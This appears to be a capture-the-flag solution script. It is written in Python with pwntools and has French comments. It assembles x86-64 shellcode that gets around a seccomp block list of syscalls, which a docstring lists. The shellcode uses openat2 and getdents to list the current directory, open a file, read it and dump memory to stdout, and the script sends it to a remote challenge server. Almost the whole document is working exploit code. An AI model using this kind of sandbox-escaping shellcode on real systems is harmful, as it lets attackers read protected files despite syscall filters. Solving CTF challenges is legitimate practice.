''' 
interdits :
0x0 -> read (partiellement)
0x1 -> write (partiellement)
0X2 -> open
0X101 -> openat
0X3B -> execve
0X142 -> execveat
0X39 -> fork
0X3a -> vfork
0X38 -> clone
0X1B3 -> clone3
0X28 -> sendfile
0XA1 -> chroot
0X29 -> socket
0X2A -> connect
'''

from pwn import *

context.arch = 'amd64'
context.os = 'linux'



shellcode = asm("""
.att_syntax

/**********************/
/* création du label 'code_region' 
/* pour pouvoir le récuperer plus tard 
/* *********************/
code_region:


/**********************/
/* openat2 du directory courant
/*********************/
mov $0x002e, %rax
push %rax
mov %rsp, %rsi       

/* structure open_how */
sub $24, %rsp
movq $0,  (%rsp)    
movq $0,  8(%rsp)      
movq $0, 16(%rsp)      
mov %rsp, %rdx      

mov $24, %r10     
mov $-100, %rdi    
mov $437, %rax       
syscall



/*********************/
/* getdents pour avoir la 
/*liste de fichiers 
/*********************/
mov %rax, %rdi        
sub $0x400, %rsp       
mov %rsp, %rsi        
mov $0x400, %rdx
mov $217, %rax
syscall


/********************/
/* openat2 du premier fichier 
/* avec une boucle pour iterer sur les 
/* differents nom de fichier
/********************/
mov $0, %r9
mov $2, %r10
loop:
    movzwq 0x10(%rsi), %rcx
    add %rcx, %rsi
    dec %r10
    cmp %r9, %r10   
    jne loop
lea 0x13(%rsi), %rsi   
mov %rbx, %rdi  

/* struct open_how */
sub $24, %rsp
movq $0,  (%rsp)    
movq $0,  8(%rsp)   
movq $0, 16(%rsp)     
mov %rsp, %rdx

mov $24, %r10
mov $-100, %rdi
mov $437, %rax       
syscall



/**************************/
/* récuperation de 'code_region' 
/* et read du fichier vers code_region+0xc00
/**************************/

lea code_region(%rip), %rdi
add $0xc00, %rdi
mov %rdi, %rsi
mov $0x4, %rdi
mov $0x50, %rdx
mov $0x0, %rax
syscall




/*******************/
/* enorme write   
/*******************/

lea code_region(%rip), %rdi
add $0x400, %rdi
mov %rdi, %rsi
mov $0x1, %rdi
mov $0x850, %rdx
mov $0x1, %rax
syscall

""")


# io = process("./new_age")
io = connect("159.89.106.147", 1337)

io.sendline(shellcode)
res = io.recvall(timeout=1)
res = res.split(b"0x")[1]
print(b"0x" + res)

